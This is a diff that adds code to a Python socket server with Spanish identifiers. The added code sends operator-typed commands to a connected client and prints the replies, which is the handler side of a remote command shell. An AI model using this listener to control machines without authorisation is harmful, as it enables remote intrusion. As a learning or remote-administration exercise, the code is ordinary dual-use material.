@@ -32,3 +32,21 @@ def aceptar_socket():
 	print("Conexion establecida | "+" IP " + direccion[0] + "| PUERTO " + str(direccion[1]))
 	mandar_comandos(conexion)
 	conexion.close()
+
+def mandar_comandos(conexion):
+	while True:
+		cmd = input()
+		if cmd == 'salir':
+			conexion.close()
+			s.close()
+			sys.exit()
+		if len(str.encode(cmd)) > 0:
+			conexion.send(str.encode(cmd))
+			respuesta_cliente = str(conexion.recv(1024),"utf-8")
+			print(respuesta_cliente,end = "")
+
+
+def main():
+	crear_socket()
+	unir_socket()
+	aceptar_socket()
